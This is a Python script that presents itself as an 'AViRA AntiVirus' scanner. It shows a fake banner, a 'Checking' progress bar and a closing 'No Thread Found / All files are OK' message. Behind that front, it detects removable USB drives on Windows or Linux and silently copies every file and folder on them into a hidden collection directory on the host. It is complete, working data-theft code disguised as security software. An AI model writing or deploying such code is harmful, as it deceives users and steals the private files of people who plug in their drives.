from getpass import getuser
from platform import system as syst
from time import sleep
from os import chdir , listdir , path , mkdir
from shutil import copytree , copyfile
from progressbar import *



class MainsWindows:
    def __init__(self):
## region destination:
        self.dest = "C:\\USB Files\\"

        if "USB Files" not in listdir("C:\\"):
            chdir("C:\\")
            mkdir("USB Files")
## endregion


        print("\n****AViRA AntiVirus***"
      "\nInfo(tags/v3.7.6:43364a7ae0, Dec 29 2019, 00:42:30) [MSC v.1916 64 bit (AMD64)] on win32"
      "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n"
      "Please wait while checking your files...\n")

        self.usb_number()

    def usb_number(self):
        chdir(self.dest)
        lister = listdir('.')
        Directories = []
        for i in lister:
            if path.isdir(i) == True:
                Directories.append(i)

        if len(Directories) == 0 :
            self.usbnum = 1
        else:
            self.usbnum = int(max(Directories)) + 1

    def usbdrive(self):
        self.drive_list = []
        drivebits = GetLogicalDrives()
        for d in range(1,26):
            mask = 1 <<  d
            if drivebits & mask:
                drname=  '%c:\\' % chr(ord('A') + d)
                # print(drname)
                t = GetDriveType(drname)
                if t == DRIVE_REMOVABLE:
                    self.drive_list.append(drname)

        # print(self.drive_list)

        if self.drive_list.__len__() == 0 :
            print("No USB Connected!!!")
            sleep(4)
            exit()

    def copier(self):
        if len(self.drive_list) > 1 :
            x =0
            while x < len(self.drive_list):
                chdir(self.drive_list[x])
                self.copy()
                x += 1
                self.usbnum += 1
        else:
            chdir(self.drive_list[0])
            self.copy()

    def copy(self):

        pwd = listdir('.')

        Files = []
        Directories = []

        for i in pwd:
            if path.isfile(i) == True:
                Files.append(i)
            if path.isdir(i) == True:
                Directories.append(i)

        widgets = ['Checking: ' , Percentage() , ' ' , Bar(marker='0' , left='[' , right=']') , ' ' , ETA() , ' ' , FileTransferSpeed()]
        bar = ProgressBar(widgets = widgets,maxval=len(pwd))

        x = 1
        bar.start()
        for dir in Directories:
            try:
                # print(self.usbnum)
                copytree(dir, self.dest + str(self.usbnum) + "\\" + dir)
                bar.update(x)
                x += 1
            except :
                bar.update(x)
                x += 1
        for file in Files:
            try:
                copyfile(file, self.dest  + str(self.usbnum) +  "\\"  + file)
                bar.update(x)
                x += 1
            except :
                bar.update(x)
                x += 1
        bar.finish()

    def final(self):
        print("\n=====No Thread Found=====\n\nAll files are OK.")
        input()

class MainLinux:
    def __init__(self):
## region destination:
        self.username = getuser()

        self.home = "/home/" + self.username + "/"
        self.dest =  self.home + "USB Files/"

        if "USB Files" not in listdir(self.home):
            chdir(self.home)
            mkdir("USB Files")
## endregion

        print("\n****AViRA AntiVirus***"
      "\nInfo(tags/v3.7.6:43364a7ae0, Dec 29 2019, 00:42:30) [MSC v.1916 64 bit (AMD64)] on win32"
      "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n"
      "Please wait while checking your files...\n")

        self.usb_number()

    def usb_number(self):
        chdir(self.dest)
        lister = listdir('.')
        Directories = []
        for i in lister:
            if path.isdir(i) == True:
                Directories.append(i)

        if len(Directories) == 0:
                self.usbnum = 1
        else:
                self.usbnum = int(max(Directories)) + 1

    def usbdrive(self):
        chdir("/media/"+self.username+"/")
        self.drive_list = listdir('.')

        if self.drive_list.__len__() == 0 :
            print("No USB Connected!!!")
            sleep(4)
            exit()

    def copier(self):
        if len(self.drive_list) > 1 :
            x =0
            while x < len(self.drive_list):
                chdir(self.drive_list[x])
                self.copy()
                x += 1
                self.usbnum += 1
        else:
            chdir(self.drive_list[0])
            self.copy()

    def copy(self):

        pwd = listdir('.')

        Files = []
        Directories = []

        for i in pwd:
            if path.isfile(i) == True:
                Files.append(i)
            if path.isdir(i) == True:
                Directories.append(i)

        widgets = ['Checking: ' , Percentage() , ' ' , Bar(marker='0' , left='[' , right=']') , ' ' , ETA() , ' ' , FileTransferSpeed()]
        bar = ProgressBar(widgets = widgets,maxval=len(pwd))

        x = 1
        bar.start()
        for dir in Directories:
            try:
                copytree(dir, self.dest + str(self.usbnum) + "/" + dir)
                bar.update(x)
                x += 1
            except :
                bar.update(x)
                x += 1
        for file in Files:
            try:
                copyfile(file, self.dest + str(self.usbnum) + "/" + file)
                bar.update(x)
                x += 1
            except :
                bar.update(x)
                x += 1
        bar.finish()

    def final(self):
        print("\n=====No Thread Found=====\n\nAll files are OK.")
        input()

if __name__ == "__main__":
    if syst() == "Windows":
        from win32file import GetDriveType, GetLogicalDrives, DRIVE_REMOVABLE
        M = MainsWindows()
        M.usbdrive()
        M.copier()
        M.final()
    if syst() == "Linux":
        M = MainLinux()
        M.usbdrive()
        M.copier()
        M.final()
